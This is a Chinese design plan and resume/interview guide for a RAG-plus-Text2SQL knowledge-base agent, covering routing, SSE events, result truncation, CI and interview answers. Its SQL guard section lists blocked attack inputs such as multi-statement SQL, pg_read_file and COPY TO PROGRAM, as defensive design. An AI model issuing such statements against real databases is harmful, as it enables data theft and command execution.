
```python
TOOLS = [
  {  # 复用现有 Retriever，零新增检索逻辑
    "name": "kb_search",
    "description": "在内部文档知识库中检索相关段落。适用于：产品规格、政策条款、操作手册、FAQ 等非结构化内容。不适用于需要统计计算的问题。",
    "parameters": {"query": "string", "top_k": "integer"},
  },
  {
    "name": "sql_query",
    "description": "对业务数据表执行只读 SELECT 查询以做精确统计。适用于：计数、求和、平均、最大最小、排名、分组对比。可用表见 schema 说明。",
    "parameters": {"sql": "string", "purpose": "string（一句话说明这个查询要回答什么，用于审计）"},
  },
  {
    "name": "list_data_tables",
    "description": "列出当前可查询的业务数据表及其字段含义。当你不确定有哪些数据可查时先调用它。",
    "parameters": {},
  },
]
```

> **工具设计要点**：`description` 里**写清"什么时候不该用"**（`kb_search` 明确写"不适用于统计"）。
> 这是提升路由准确率最低成本的手段——比在 prompt 里写一堆规则有效。

### 5.4.4 事件契约扩展（**必须向后兼容**）

```typescript
// 现有 4 种事件全部保留，语义不变
| { type: "meta"; sources; retrieved_count; hidden_count }
| { type: "delta"; text }
| { type: "done"; answer; session_id?; history_length? }
| { type: "error"; message }

// 新增 6 种（旧前端不认识就忽略，不会崩）
| { type: "route";  target: "rag" | "sql" | "multi"; reason: string }
| { type: "tool_call";   id; name; args }        // 显示"正在查询数据库…"
| { type: "tool_result"; id; ok; summary; rows?; truncated? }
| { type: "sql";    sql: string; row_count: number; elapsed_ms: number; retries: number }
| { type: "clarify"; question: string }          // 口径澄清
| { type: "degraded"; reason: string }            // 降级到纯 RAG
```

**前端处理**：`stores/chat.ts` 的 `chatStream` 回调对未知 `type` 走 `default` 分支**忽略**——
**旧前端 + 新后端不会崩**，新前端则渲染出 Agent 执行轨迹面板。

**验收标准（关键）**：`meta/delta/done` 三种事件的**帧序列与内容与改造前逐字节一致**，
即改造前后用同一问题对比 SSE 原始帧，diff 为空。**→ 先写这个 diff 测试，再改代码（测试先行）。**

### 5.4.5 ⚠️ 一个必须提前处理的存储变更：`reasoning_content`

**背景**（见 4.4 节已核实约束）：带 `tools` 的请求必须把 `reasoning_content` 完整回传，否则 400。
而现有 `messages` 表**只存 `role` 和 `content`**（`models/chat.py:64`），注释还明确写着
*"仅存干净的 role/content，不含参考资料"*。

**方案：加列，不改列**（保持向后兼容，旧会话不受影响）：

```python
# models/chat.py —— 新增列，现有列一律不动
reasoning_content: Mapped[Optional[str]] = mapped_column(Text, nullable=True)
tool_calls: Mapped[Optional[dict]] = mapped_column(JSONB, nullable=True)
```

**三个必须注意的点**：
1. **`reasoning_content` 会显著增加 token 消耗**（思维链通常比答案长数倍），
   所以**只在 Agent 路径回放**，纯 RAG 路径不存不回放——否则会把现有 RAG 成本推高。
2. **历史裁剪（`max_history_messages=20`）会破坏 `reasoning_content` 完整性**，可能导致 400。
   → 裁剪必须**按"完整的工具调用轮次"为单位**，不能按单条消息裁。
   **这是本项目最容易被忽略的集成坑。**
3. **Alembic 迁移是纯增列**（`ADD COLUMN ... NULL`），PostgreSQL 下**不需要重写表**，秒级完成、零停机。

**验收**：跑完整"工具调用 → 多轮追问"会话，断言第二轮不带 400；
断言纯 RAG 会话的 `reasoning_content` 全为 NULL（无成本泄漏）。

**简历价值**：⭐⭐⭐⭐ 「发现并解决带 tools 请求必须回传 `reasoning_content` 否则 400 的协议约束，设计按工具轮次为单位的裁剪策略」——**这种细节是"真的写过"的强证据**。

---

## P5 · 三层混合路由（2 天）

### 5.5.1 ⚠️ 先厘清路由拓扑：**两道关卡，不是一道**

「进系统先做意图识别，需要就转 SQL，不需要就走原来的 RAG」——这个描述**方向正确，但有一处需要修正**：
真实链路是**两道关卡串联**，而不是单一的入口分叉。

```
用户问题
  │
  ├─ 关卡一：入口规则路由（L1，0 成本，位于 Agent Loop 之外）
  │    route_by_rules(q) -> "sql" | "rag" | None
  │    · 命中"聚合词 + 已注册列名词" → 强路由 SQL，跳过 LLM 决策
  │    · 命中"文档类词"（质保/条款/手册/如何） → 强路由 RAG
  │    · 都不命中 → None，进关卡二
  │
  ├─ 关卡二：Agent 内 LLM 工具选择（L2，1 次 LLM）
  │    把 3 个工具的 schema 交给 LLM 自己选：
  │    · 调 kb_search   → 走原 RAG 链路（复用 Retriever，零改动）
  │    · 调 sql_query   → 走 Text2SQL 链路
  │    · 两个都调       → 跨源联合推理（如"研发薪资 vs 文档带宽"）
  │    · 不调任何工具   → 直接回答（闲聊/常识）
  │
  └─ 关卡三：兜底降级（L3）
       任何异常 / 超步数 / 超时 / 工具全失败 → 强制退回纯 RAG
```

**为什么要两道关卡**：

| 只保留 | 问题 |
|---|---|
| 只留关卡二（全交 LLM） | 每轮多 1~2s 延迟；LLM 可能在"文档里也有表格"时误选 SQL |
| 只留关卡一（纯规则） | 规则无法处理"研发薪资和文档带宽比一下"这类跨源问题 |
| **两关串联（本方案）** | **规则层行为确定、可被单测钉死；LLM 只处理模糊地带**——兼顾延迟、确定性与灵活性 |

> 💡 **这一点决定了方案的可行性**：关卡一的规则路由是一条**纯函数**（输入问题、输出目标），
> 可以写出表驱动单测——**评测集里那 107 题就是现成的测试用例**。
> 也就是说：**「意图识别」在本方案里是可测试的，不是靠 prompt 祈祷。**

### 5.5.2 三层路由表

| 层 | 机制 | 覆盖场景 | 成本 |
|---|---|---|---|
| **L1** | **规则词表**：聚合词（多少/几个/最多/最少/平均/排名/占比/总计/统计/同比）+ 已注册列名词 | 明显统计题 → 强路由 SQL | 0 |
| **L2** | **LLM function calling**：3 个工具 schema 交模型自主选 | 模糊地带、多工具协作 | +1 次 LLM |
| **L3** | **兜底纯 RAG**：无 tool_call / 工具全失败 / 超时 | 保证零回归 | 0 |

**L1 词表可测试化**：做成配置 + 表驱动单测，面试时可现场展示"改一个词表就多覆盖一类问题"。

> ⚠️ **规则路由的陷阱样本**：评测集里真有「布洛芬最多多久吃一次？」——
> 命中聚合词"最多"但**不是统计题**。所以 L1 必须**同时**命中聚合词**与**列名词才强路由，
> 否则交 L2。**这个反例就是规则层必须可单测的原因。**

**混合场景示例**（体现 Agent 价值）：
> Q：「我们公司研发部门的平均薪资，和文档里规定的薪资带宽上限比，超了吗？」
> → 需要 **SQL（研发部门平均薪资）+ RAG（文档里的薪资带宽政策）两个工具**，
>   再让 LLM 做**跨源推理**。这是**任何一个单引擎方案都答不了**的问题——
>   也是简历上最值得写的一句："支持跨结构化/非结构化数据源的联合推理"。

### 5.5.3 ⚠️ 降级必须"原样走 RAG"，包括 `meta` 字段

**这是最容易在实现时写错、且会直接导致前端 UI 退化的一点。**

非 Agent 路径的 SSE 首帧是：
```json
{"type":"meta","sources":[...],"retrieved_count":5,"hidden_count":0}
```
前端的「**已隐藏 N 条**」徽标与来源列表**完全依赖这一帧**（`stores/chat.ts` 的 `meta` 分支 +
`SourcesList.vue`）。

**如果 Agent 降级到 RAG 时只是"调用了 kb_search 然后生成答案"，前端拿不到 `meta` 帧，
来源列表和徽标就会永久空着**——用户会以为功能退化了，而实际上是降级路径漏发事件。

**对策（写进验收标准）**：
```python
# 无论走哪条路由，kb_search 一旦执行，就必须补发一个标准 meta 帧
if tool_name == "kb_search":
    yield {"type": "meta", "sources": format_sources(chunks),
           "retrieved_count": len(chunks), "hidden_count": dropped}
```
**验收**：改造后用**同一批 107 题**跑一遍，断言每题只要有知识库检索，
`meta` 帧的字段集合与改造前**完全一致**（`sources / retrieved_count / hidden_count` 三个键都不缺）。
**→ 这条断言应与 5.4.4 的帧序列 diff 测试放在一起，作为同一道回归门禁。**

### 5.5.4 ⚠️ `sql_query` 必须自己管"大结果集"，不能靠推理模型分流

**一个设计缺陷的修正**：我最初的想法是"让 `sql_query` 在描述里写清适用场景，
让模型自己判断该返回明细行还是聚合值"——**这不可靠**。

原因：**LLM 不会预知结果集大小**。用户问"列出薪资最高的 10 个人"，返回 10 行没问题；
但若模型写出 `SELECT * FROM employees`（无 LIMIT），或用户问"所有人薪资明细"，
结果集可能上千行——**塞进 prompt 会瞬间炸掉上下文窗口**。

**正确做法：由工具自己按结果集规模决定返回形态**（在 `executor.py` 里，不依赖模型判断）：

| 结果集规模 | 返回形态 | 后续 |
|---|---|---|
| 行数 ≤ 50 | **完整行**塞进 observation，交 LLM 生成自然语言答案 | 常规链路 |
| 行数 > 50 | 只返回：列名 + 行数 + 前 5 行样例 + **是否触达 LIMIT 上限** | prompt 要求基于"统计概要"作答，**或**让 LLM 改写为聚合查询 |
| 行数 == LIMIT 上限 | 额外标注 `truncated: true`，**明确告知 LLM"结果被截断，不要声称这是全部"** | 防 LLM 把截断结果当全集汇报 |

> **最后一行是真正的坑**：若不标注截断，LLM 会非常自然地把"前 200 行"当成"全部数据"来回答，
> 于是又回到第三部分那个"错误但自信"的老问题——**只是这次错误来自截断而非检索**。
> 所以 `truncated` 标志必须**同时**出现在 SSE 事件（给用户看）和 observation（给 LLM 看）。

**简历价值**：⭐⭐⭐⭐ 「三层混合路由（规则→LLM 工具选择→RAG 兜底），规则层可单测可表驱动；
设计按结果集规模自适应的大结果集保护，避免 Agent 上下文被查询结果挤爆」

---

## P6 · 前端 Agent 可视化（2.5 天）

| 组件 | 内容 |
|---|---|
| `AgentTrace.vue`（新增） | 折叠式执行轨迹：`🔍 路由→SQL` / `📊 执行 SQL（120ms，3 行）` / `✅ 生成答案`，每步可展开看详情 |
| `SqlBlock.vue`（新增） | SQL 代码块（复用 markdown-it 代码高亮）+ 「复制 SQL」按钮 |
| `ResultTable.vue`（新增） | 结果集转表格，数值右对齐，`NULL` 灰显，`truncated` 提示 |
| `ResultChart.vue`（新增，可选） | **ECharts（`vue-echarts`）** 柱状/折线/饼图。**统计类问题没有图表会显得很业余** |
| `MessageBubble.vue`（改） | 挂载以上组件 |
| `stores/chat.ts`（改） | 处理 6 种新事件；`default` 分支忽略未知类型 |
| `types.ts`（改） | 扩 `StreamEvent` 联合类型 |

> 当前前端依赖极简（仅 `markdown-it` / `pinia` / `vue`），ECharts 需**按需引入**
> `echarts/core` 只注册柱/折/饼，避免包体积膨胀。

**验收**：录 90 秒演示视频，含 4 场景：纯文档问答 / 纯统计问答 / 混合问题 / 口径澄清。

**简历价值**：⭐⭐⭐ 「前端实现 Agent 执行轨迹可视化与 SQL 结果表格/图表渲染」——**面试官经常要求现场演示，可视化决定第一印象**。

---

## P7 · 工程完备性补齐（3 天，按 ROI 排序）

| # | 任务 | 为什么值得做 | 简历价值 |
|---|---|---|---|
| **7.1** | **GitHub Actions CI**：lint + pytest + 前端 build + **eval 阈值门禁** | 把「评测 99%」从**一次性结论**变成**持续保证**——这是"工程能力"与"跑过一次脚本"的分水岭 | ⭐⭐⭐⭐⭐ |
| **7.2** | **JWT + RBAC**：`Principal` 扩 `roles`，`analyst/admin` 区分；**SQL 工具按角色授权**（普通用户不能查全公司薪资） | Text2SQL 把 C3 的洞放大成"谁能查薪资"，必须补。**只改 `resolve_principal` 一个函数**（代码里已预留注释） | ⭐⭐⭐⭐⭐ |
| **7.3** | **LLM 成本记账**：usage 落 `llm_usage` 表（模型/tokens/租户/会话/耗时），出「人均问答成本」看板 | Agent 一次问答 5–10 次 LLM 调用，**没有记账等于裸奔**；且 ✅ 实测每帧都带 usage，采集零成本 | ⭐⭐⭐⭐ |
| **7.4** | **限流与配额**：nginx `limit_req` + 应用层租户令牌桶 | SQL 执行是新的昂贵攻击面 | ⭐⭐⭐ |
| **7.5** | **Prometheus 指标**：QPS / P95 / Agent 步数分布 / SQL 拒绝数 / EX 趋势 | 补 C6 | ⭐⭐⭐⭐ |
| **7.6** | **结构化日志 + trace_id 贯穿** HTTP→Agent→worker | 补 C6 | ⭐⭐⭐ |
| **7.7** | **会话 seq 竞态修复**（DB 序列或行锁） | 补 B5，Agent 多步写入会放大 | ⭐⭐⭐ |
| **7.8** | **PG/Qdrant 定时备份 + 对账任务** | 补 C5 | ⭐⭐⭐ |

**7.2 是本阶段最高优先级**：Text2SQL 一旦上线，"谁能查什么数据"从技术问题变成**合规问题**。

---

## P8 · 文档、评测与叙事收口（1.5 天）

| 任务 | 产物 |
|---|---|
| 重写 README | 从「RAG 平台」升级为「内部知识库 Agent」，含架构图、演示 GIF、量化指标表 |
| 补设计文档 | 已有《项目全景解析》+ 本方案，形成**完整设计文档链** |
| 面试题库扩充 | 现有《RAG 面试题库 60 题》→ 增补 Agent / Text2SQL / SQL 安全 20 题 |
| 录演示视频 | 90 秒，4 场景 |
| 简历条目定稿 | 见第六部分 |

---

## 5.9 每阶段风险与规避

| 阶段 | 主要风险 | 规避 |
|---|---|---|
| P0 | 基线未固化导致后续无法判断回归 | 必须产出 `baseline_v1.json` + tag |
| P1 | 中文列名/合并单元格/大标题行导致建表错位（`cost_data.xlsx` 第 1 行就是大标题） | 复用 `loader.py` 表头探测；**建表后与 pandas 直读结果比对断言** |
| P2 | sqlglot 方言差异导致合法 SQL 被误拒 | 用 `dialect="postgres"`；**误拒比漏放安全**，但要记录误拒率并纳入评测 |
| P3 | LLM 列名幻觉（`dept` vs `department`） | 列注释给别名；报错回灌；EXPLAIN 预检 |
| P4 | 事件协议扩展破坏前端 | **测试先行**：先写帧序列 diff 测试再改代码 |
| P4 | `reasoning_content` 未回传导致 400 | 见 5.4.5；按工具轮次裁剪 + 加列迁移 |
| P5 | 规则路由误判（"最多多久吃一次"被当统计题） | 必须**同时**命中聚合词与列名词，否则交 L2 |
| P6 | ECharts 引入增加包体积 | 按需引入 `echarts/core` |
| P7 | RBAC 改动触碰安全核心 | `resolve_principal` 是唯一入口，只改这一个函数 + 加测试 |
| 全程 | 后端镜像重建后 nginx 502（已知坑） | 每次重建后补 `docker compose restart frontend` |

---
---

# 第六部分 · 简历包装与面试素材

> 目标岗位：AI 应用开发 / 大模型应用开发 / 后端开发（国内互联网 & 软件公司）
> **铁律：只写能扛住追问的数字。** 写不出来的宁可写定性，也不要编一个会被问穿的指标。

## 6.1 简历项目条目（三种版本）

### 版本 A · 大模型应用开发岗（推荐主用，5 条）

> **内部知识库 Agent｜RAG + Text2SQL 双引擎**（个人项目 · 2025.xx–2025.xx）
> 技术栈：Python 3.12 / FastAPI / Vue3+TS / PostgreSQL / Qdrant / Redis / ARQ / Docker Compose / DeepSeek-V3.2

- **架构**：从零设计并实现前后端分离的多租户知识库 Agent，**双引擎路由**——非结构化问题走「混合检索 + 精排」RAG 通道，统计类问题走 **Text2SQL 精确计算**通道，支持跨源联合推理（如"研发部平均薪资 vs 文档规定的薪资带宽"）。
- **RAG 引擎**：自研 dense(bge-m3) + BM25 稀疏双通道 **RRF 融合** + 交叉编码器精排链路；识别出「RRF 分 / 向量分 / rerank 分量纲不可跨 query 比较」这一普遍误区，**仅对 rerank 绝对分**设计「绝对下限 + 相对断层 + 保底 N 条」组合阈值；107 题评测集上 **Recall@5 99.0% / MRR 0.97**。
- **Text2SQL 与安全**：建 4 张业务表（1 万行员工表等）并自研 Schema 语义层（列注释 + 枚举值内联）；设计**四层纵深防御的只读 SQL 网关**（sqlglot AST 白名单 → 只读事务 + 超时 → `GRANT SELECT` 角色 → PostgreSQL RLS 行级隔离），**10 类攻击载荷（DROP / 多语句 / pg_read_file / COPY TO PROGRAM 等）100% 拦截**；自建 50 题中文评测集，**Execution Accuracy XX%**。
- **Agent 编排**：手写**有界状态机** Agent Loop（而非引入图编排框架），实现「规则前置路由 → LLM function calling → RAG 兜底」三层混合路由；五重防失控（步数上界 / 墙钟超时 / **LLM 调用数上界** / 相同调用去重 / 失败降级纯 RAG）。
- **工程化**：重构同步 RAG 内核为异步 API 的三种桥接（`run_in_threadpool` / `iterate_in_threadpool` / `asyncio.to_thread`），SSE 流式首帧 <1s；Docker Compose 六服务编排 + 一次性 migrate；GitHub Actions CI 门禁（lint + 45 单测 + 前端 build + **评测阈值门禁**）。

### 版本 B · 后端开发岗（突出架构与可靠性，4 条）

> **内部知识库 Agent 后端｜FastAPI + PostgreSQL + Qdrant 异步架构**

- 采用 `api → service → repository → model` 四层架构 + 依赖注入，仓储只 `flush`、事务边界收敛在 service 层；45 项 hermetic 单测（不依赖外部服务，4.3s 跑完）。
- 设计**异步文档入库流水线**：上传秒回 `202 + task_id`，ARQ worker 后台执行「解析→分块→向量化→索引」，content-hash 点 ID 实现**幂等 upsert**，重灌前按 source 精确清理旧向量，失败 re-raise 触发重试（max_tries=5）。
- 实现**三段一致性删除**：先清 Qdrant 向量 → 再删磁盘副本 → 全部成功才删登记行，任一环节失败保留记录可重试；外键 `ON DELETE SET NULL` 保留任务审计。
- **单 collection 多租户隔离**：`tenant_id` 多值 keyword 字段 + 服务端 `enforced_filter` 强制注入并剥除客户端覆盖；鉴权「软关闭」设计使本地调试零成本；升级 JWT/RBAC 仅需替换单一函数。

### 版本 C · 一句话版（简历头部个人简介）

> 独立完成「内部知识库 Agent」全栈项目：自研 RAG 混合检索链路（Recall@5 99%）+ Text2SQL 精确统计通道 + 四层 SQL 安全网关 + 有界 Agent 编排，全栈容器化交付。

## 6.2 量化指标清单（哪些能写、怎么测、注意什么）

| 指标 | 本项目实测/目标 | 怎么测 | 能不能写 |
|---|---|---|---|
| **Recall@5** | **99.01%**（✅ 实测，`159d639`） | `python -m eval --retrieval-only`，107 题 | ✅ **必须注明是检索口径**，不是答案正确率 |
| **MRR** | **0.9703**（✅ 实测） | 同上 | ✅ |
| **rank_1 命中数** | 96 / 101 | 同上 | ✅ 细分指标显专业 |
| **pytest** | **45 passed / 4.29s** | `pytest -q` | ✅ |
| **代码量** | 7848 行业务代码 / 81 文件 | 脚本统计 | ⚠️ 写"约 8k 行"即可，别当核心卖点 |
| **Text2SQL Execution Accuracy** | 待测，目标 ≥85% | 自建 50 题，比对执行结果集 | ✅ **改造后一定要测出来** |
| **Valid SQL Rate** | 待测 | 生成 SQL 通过 guard + 成功执行比例 | ✅ |
| **SQL 攻击拦截率** | 目标 10/10 | `test_sql_guard.py` 攻击载荷表 | ✅ **有测试文件可现场展示** |
| **首 token 延迟 (TTFT)** | 实测 <1s | 脚本计时 SSE 首帧 | ✅ 有 nginx `proxy_buffering off` 的因果链支撑 |
| **Agent 平均步数** | 待测 | 从 `agent_runs` 表聚合 | ✅ **很能体现 Agent 工程** |
| **单次问答 LLM 成本** | 待测 | usage 落库 × 单价 | ✅ **强烈建议测**，Agent 项目里会记账的人极少 |
| 端到端 P95 延迟 | 待测 | `locust` / `k6` | ⚠️ 没测就别写 |
| 检索语料规模 | 15 文档 / 1402 向量点 | Qdrant `count` | ⚠️ 规模太小，**不要主动写**；被问到诚实说"演示语料，架构支持水平扩展" |

### ⚠️ 三个「不要写」

1. **不要把 Recall@5 99% 写成「准确率 99%」**——面试官第一句就问"检索还是答案？"。诚实区分反而加分。
2. **不要编 QPS / 并发数**。个人项目没有真实流量，写"支持 1000 QPS"是自爆。
3. **不要写"掌握大模型微调"**——本项目没有微调（纯 prompt + function calling），被追问会很难看。

## 6.3 面试必答 15 问

> Q1–Q12 覆盖架构/检索/SQL 安全/Agent 编排；**Q13–Q15 专门覆盖路由拓扑、数据源边界、大结果集处理**——
> 这三题是这份方案最容易在面试中被追问、也最能体现"真的想过边界"的地方。

### Q1. RRF 融合为什么不用加权求和？
**答**：dense 余弦分 ∈[-1,1]、BM25 分无界、两者**量纲不同且分布随 query 变化**，加权求和必须先归一化，而归一化参数无法跨 query 稳定。RRF 只用**排名**（`1/(k+rank)`），天然免量纲、对分数尺度不敏感、无需调参。
**坑**：别说"RRF 更准"，要说"RRF 更**稳健、免调参**"。

### Q2. rerank 分数能不能跨 query 比较？低相关过滤怎么做的？
**答（本项目最强的一题）**：不能。RRF 融合分只有 ~0.016 量级、向量分与 query 难度强相关，只有**交叉编码器的绝对相关分**才有跨 query 语义。所以过滤**按 `score_kind` 分支**：只有 rerank 分启用阈值（绝对下限 + 强锤点相对断层 + 保底 N 条），RRF/向量分**只截断不设限**。套统一绝对阈值会整页误杀，这是很多 RAG 项目的通病。
**加分**：主动说"被过滤条数沿链路透传到前端徽标，把可解释性做进 UI"。

### Q3. 【核心】既然 RAG 做到 99%，为什么还要上 Text2SQL？
**答（现场给实测数据，杀伤力最大）**：我问"Sales 和 Engineering 各多少人、差多少"。RAG 答 Sales 1042（对）、Engineering **25**（错，真值 1010）、差 **1017**（错，真值 **32**，误差 31.8 倍）。
**关键不是它答错了，而是它错得毫无信号**：5 条检索结果 rerank 分 0.70/0.66/0.58/0.51 全部正常，低相关过滤一条都没拦，它还自己写了一句"逻辑上可调和"来自我辩护。
**根因**：检索的**相关性度量不度量完备性**。万行表切成 242 块，任何单块都不含全表聚合事实；我加的"预生成聚合摘要块"补丁只能覆盖"分组计数最多/最少 + Top3/Bottom3"，而"任意两部门对比"的组合空间是 O(n²)，穷举预计算不可行。
**所以**：凡需跨全量数据精确计算的问题，必须走 SQL。
**坑**：这一题答好了，整场面试的主动权就在你手里。

### Q4. Text2SQL 怎么防止删库 / 越权？
**答**：**四层纵深防御，任何一层单独都不够**：
① 应用层 `sqlglot` 解析 AST 白名单——只允许单条 `Select`，拒绝 DDL/DML、多语句、`pg_catalog`、`SELECT INTO`、`COPY TO PROGRAM`；
② 事务层 `SET LOCAL transaction_read_only=on` + `statement_timeout=5s` + 强制包裹 `LIMIT`；
③ 角色层独立只读角色 `GRANT SELECT` only + `default_transaction_read_only`；
④ 数据层独立库 + **PostgreSQL RLS**（`SET LOCAL app.tenant_id`），**LLM 写不出 WHERE 也越不过行级隔离**。
**坑**：一定要说"为什么不能只靠正则"——注释混淆、方言差异、合法 SELECT 打满 CPU（DoS），单层必漏。
**加分**：引用 sqlglot 官方 FAQ"SQLGlot is a transpiler, not a validator"，说明我连库的官方立场都查过。

### Q5. Agent 怎么防止死循环？
**答**：五重：步数硬上界 5、墙钟超时 60s、**LLM 调用数上界 8（成本上界，框架默认往往没有）**、相同工具+相同参数去重检测、任一步失败**降级到纯 RAG 而非报错**。
**加分**：强调"用有界状态机而非 `while True`，所以循环行为可以被单测钉死"。

### Q6. 为什么手写 Agent 而不用 LangGraph？
**答**：三点——只有 3 个工具、循环上界明确、必须复用既有 SSE 契约与 hermetic 测试体系。约 300 行手写换来 100% 可单测（新增 12 条测试覆盖路由/终止/降级）。**我评估过 LangGraph（实测版本 1.2.14，MIT），它的 checkpoint/HITL 能力在我当前场景用不上；如果要做多 Agent 协作或 SQL 执行前的人工审批，我会切过去。第二选择是 Pydantic AI（2.54.0），它与我的 Pydantic v2 + FastAPI 技术栈最契合。**
**坑**：别说"LangGraph 太重/不好用"（显得没调研过），要说"评估后判断**当前需求用有界循环即可覆盖**"。

### Q7. 多租户怎么隔离？Text2SQL 会不会打破隔离？
**答**：RAG 侧是 `tenant_id` 多值 keyword + 服务端 `enforced_filter`（**剥除客户端传入的租户键**，防越权覆盖）。Text2SQL 侧**升级为数据库层强制**：RLS + `SET LOCAL app.tenant_id`，比应用层约定更硬。并加 RBAC——普通用户不能查全公司薪资。
**加分**：指出"Text2SQL 把'租户隔离'从技术问题变成了合规问题，所以我把它从应用层下沉到数据库层"。

### Q8. 同步 RAG 内核怎么接进异步 FastAPI？
**答**：三种桥接各司其职：`run_in_threadpool`（单轮问答）、`iterate_in_threadpool`（SSE 逐步驱动同步生成器）、`asyncio.to_thread`（worker 重活）。**没有把同步代码硬改成 async**——迁移风险控制优先，事件循环同样不被阻塞。
**坑**：会被追问"线程池耗尽怎么办"——答"默认 40 线程，LLM 调用是 IO 密集不占 GIL，瓶颈在上游 API；上量后应改 httpx 异步 + 信号量限流"。

### Q9. 大表（1 万行）怎么处理？为什么表格是 RAG 黑洞？
**答**：三层：① 行级语义化（每行 → "部门为 Engineering，团队为 Backend，人数为 12"）；② 大表切块每块补表头；③ 受保护块禁止跨类型合并（踩过坑：合并把表格和文本粘一起导致检索质量回退）。**但要承认**：这些手段解决"查某一行"，解决不了"全表聚合"——那正是上 Text2SQL 的原因。

### Q10. 评测怎么做的？怎么证明重构没让效果变差？
**答**：三层：**45 条 hermetic 单测**（毫秒级、monkeypatch 网络段，不真连 Qdrant/PG/LLM）+ **107 题检索评测**（Recall@K / MRR / 逐题明细，重构前后逐项对齐）+ **compose 端到端冒烟**。改造后加 CI 阈值门禁，评测从"跑过一次"变成"持续保证"。
**加分**：坦白"目前只有检索指标，没有答案忠实度（faithfulness）的 LLM-as-judge"，并说明是下一步。

### Q11. Agent 的流式输出怎么把中间步骤推给前端？
**答**：**扩帧而非改帧**。原 4 类事件语义完全不变，新增 6 类（route/tool_call/tool_result/sql/clarify/degraded）。前端对未知 type 走 `default` 忽略分支，所以**旧前端+新后端不崩**。验收方式是改造前后用同一问题 diff SSE 原始帧序列，要求为空。

### Q12. 这个项目你觉得还有什么不足？
**答（必须有，且要具体）**：① 无答案质量评测（faithfulness/relevance），只有检索指标；② worker 单并发，大文件堵队尾；③ rerank 外呼无缓存，每次查询都打 API；④ 会话 `next_seq` 读-增-写有竞态；⑤ Langfuse 有埋点但无指标聚合与告警；⑥ 检索语料仅 15 个文档，缺乏规模验证。
**坑**：这一题**答"没什么不足"直接出局**。答得越具体越显得真做过。

### Q13. 【路由】你怎么判断一个问题该查文档还是该查数据库？
**答**：**两道关卡串联，不是一道**。
**关卡一在 Agent 之外**，是**纯函数规则路由**——必须**同时**命中「聚合词」与「已注册列名词」才强路由 SQL，
命中「文档类词」强路由 RAG，都不命中才放行给 LLM。因为它是纯函数，**评测集那 107 题就是它的表驱动测试用例**。
**关卡二在 Agent 之内**，用 function calling 让 LLM 自己选工具，可以单选也可以多选（做跨源推理）。
**关卡三是兜底**：任何异常/超步数/超时都强制退回纯 RAG。
**为什么不全交 LLM**：每轮多 1~2s 延迟，且 LLM 可能在"文档里也有表格"时误选 SQL。
**为什么不全用规则**：规则处理不了"研发薪资和文档带宽比一下"这类跨源问题。
**加分**：主动说陷阱样本——「布洛芬最多多久吃一次？」命中聚合词"最多"但不是统计题，
**这就是规则层必须可单测的原因**。

### Q14. 【数据源】你的 Text2SQL 支持哪些数据源？为什么？
**答**：**只做 xlsx**（可低成本扩 CSV），这是**有依据的设计边界**。
**先厘清概念**：SQL 不直接读文件，ETL 只在入库时把表格转成关系表，之后查的都是数据库表。
所以问的是"哪些格式能**可靠地**转成表"：
xlsx 有**天然表边界（sheet）**和可恢复的类型信息，所以能做；
PDF 的表格提取是启发式的、**跨页表会截断**、没有表名；DOCX 常含多个异构表且语义无来源；Markdown 表格是排版不是数据集。
**关键理由**：用 PDF/DOCX 建表会引入**静默错误**——而"消灭静默错误"正是我这个项目的核心命题（见 Q3）。
**加分**：说清一个技术障碍——现有 loader 把所有单元格 `str()` 化了，类型信息已丢失；
我**没有去改造那个 1592 行的 loader**（会触碰评测基线），而是让 ETL 直接读原始文件、与 RAG 通道解耦。

### Q15. 【Agent 工程】Agent 调用 SQL 拿到几千行结果怎么办？
**答**：**由工具自己按结果集规模决定返回形态，不依赖 LLM 判断**——因为 **LLM 无法预知结果集大小**。
≤50 行返回完整行；>50 行只返回列名 + 行数 + 前 5 行样例；
**触达 LIMIT 上限时额外标注 `truncated: true`，并在 observation 里明确告诉 LLM"结果被截断，不要声称这是全部"**。
**坑（也是我特意设计的点）**：如果不标注截断，LLM 会非常自然地把"前 200 行"当成"全部数据"来回答——
**就又回到了那个"错误但自信"的老问题，只是这次错误来自截断而非检索**。
所以 `truncated` 标志必须**同时**出现在 SSE 事件（给用户看）和 observation（给 LLM 看）。

## 6.4 面试演示脚本（90 秒，练熟）

| 时间 | 动作 | 说什么 |
|---|---|---|
| 0–10s | 打开 UI，展示租户切换 | "多租户隔离，切换租户后文档列表和会话都随之隔离" |
| 10–30s | 问**纯文档问题**："路由器整机质保多久？" | "走 RAG 通道，注意来源列表和'已隐藏 N 条'徽标" |
| 30–55s | 问**纯统计问题**："Sales 和 Engineering 各多少人，差多少？" | "**这次走 SQL 通道**——看执行轨迹：路由→生成 SQL→执行 120ms→3 行结果。答案是 1042 / 1010 / 差 32" |
| 55–75s | 问**混合问题**："研发平均薪资超没超文档规定的带宽上限？" | "**跨源联合推理**：先 SQL 算平均薪资，再 RAG 查政策文档，最后联合判断" |
| 75–90s | 展开 Agent 轨迹 + 展示 SQL 与结果表 | "SQL 和执行结果都对用户可见，可解释、可审计、可复现" |

**关键**：第 3、4 步是这个项目**区别于所有其他 RAG 项目**的地方，务必留足时间。

## 6.5 差异化定位（为什么这个项目在简历堆里能被记住）

市面上 90% 的 RAG 项目简历长这样：
> "基于 LangChain + 向量数据库搭建知识库问答，实现文档上传、向量检索、流式输出。"

**你的项目要打在三个差异点上**：

| 差异点 | 一句话说法 | 为什么稀缺 |
|---|---|---|
| **1. 有失败证据** | "我先证明了 RAG 在统计类问题上会**静默答错 31.8 倍**，才引入 Text2SQL" | 99% 的人只写"实现了什么"，不写"发现了什么不行、为什么" |
| **2. 安全是设计出来的** | "四层纵深防御，10 类攻击载荷 100% 拦截，且每层都能说清为什么单层不够" | 大多数 RAG 项目零安全设计；Text2SQL 项目普遍用正则糊弄 |
| **3. 量化是可复现的** | "107 题评测集 + CI 阈值门禁 + 每帧 usage 记账" | 指标不是"跑了一次挺好"，而是**可持续保证** |

> **一句话总结你的项目叙事**：
> "我把一个 RAG 项目做到了检索 Recall@5 99%，然后用一个真实案例证明了它**在统计类问题上会静默产生 31.8 倍的错误**——
> 因为检索的相关性度量**不度量完备性**。于是我把它升级成双引擎 Agent：
> 用 Text2SQL 做精确计算，用四层防御保证 SQL 安全，用有界状态机保证 Agent 不失控。"

---
---

# 附录 · 起步清单（明天就能开始）

按顺序执行，前 3 天即可看到"统计问题被 SQL 正确回答"：

```powershell
# 第 1 步：固化基线（P0，30 分钟）
cd D:\PythonProjects\personal_rag\backend
..\.venv\Scripts\python.exe -m pytest -q                      # 期望 45 passed
